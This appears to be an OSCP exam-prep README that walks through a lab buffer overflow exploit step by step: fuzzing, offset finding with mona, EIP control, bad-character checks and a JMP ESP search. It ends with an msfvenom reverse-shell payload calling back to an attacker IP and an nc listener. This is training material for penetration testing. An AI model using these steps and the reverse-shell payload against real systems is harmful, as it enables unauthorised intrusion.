# OSCP_Prep: Buffer Overflow

For OSCP Buffer Overflow preparation, you don't need complicated codes and/or advanced python skills. You just need a simple python code and work your way up. The following steps are to help you in each of the step that you take. These 6 simple steps are just what you need for OCSP Buffer Overflow preparation.

Free TryHackMe Room: https://tryhackme.com/room/bufferoverflowprep

### Setting up Mona script (for own lab)

Github: https://github.com/corelan/mona.git

```bash
git clone https://github.com/corelan/mona.git

#copy the mona.py and put it inside:
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
```

<br>

```bash
#connecting to the THM lab machine
xfreerdp /u:admin /p:password /cert:ignore /v:192.168.10.10
```

### 01 Fuzzing

```bash
python3 01-fuzz.py
```

Press `Ctrl + C` after the application has been crushed. Note down the byte number. (Example: Crushed at `2000`)

### 02 Finding Offset

```bash
#kali $>
msf-pattern_create -l 2000

#update the byte and run the script
python3 02-offset.py
```

At this point, I'm assuming you have Mona setup. 

```bash
#immunity console
!mona findmsp -distance 2000
```

Find `EIP` normal pattern. (Example: EIP contains normal pattern: `0x42987857` (offset `1876`))

### 03 Controlling EIP

```bash
#update the script and run
python3 03-eip.py
```

You should see `424242` for `EIP`.

### 04 Finding Bad Characters

Setting up mona working directory:

```bash
#immunity console
!mona config -set workingfolder c:\mona\%p
```

Generating byte array:

```bash
#immunity console
!mona bytearray -b "\x00"
```

Running the script:

```bash
python3 04-badchar.py

#immunity console
!mona compare -f C:\mona\oscp\bytearray.bin -a 0321FF88
```

Generating byte array with bad characters removed. Update the script and run again util you see 'Unmodified' status in mona memory comparison result.

```bash
#immunity console
!mona bytearray -b "\x00\x0d"

python3 04-badchar.py

#immunity console
!mona compare -f C:\mona\oscp\bytearray.bin -a 03B2FF88
```

### 05 Finding a Jump Point

```bash
#immunity console
!mona jmp -r esp -cpb "\x00\x0d"
```

Set the break point by entering the pointer address and pressing `F2`.

```bash
python3 05-pointer.py
```

If the pointer address stop at `EIP`. You are good to go.

### 06 Popping Calculator

**Make sure to update the bad character that you found.

```bash
#kali $>
msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0d' -f c

#update the script and run
python3 06-calc.py
```

After successfully popping the calculator app, next step is to get a shell.

**Again, make sure the get the bad character right. 

```c++
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.11 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0d"

nc -lvnp 443

python3 07-exploit.py
```



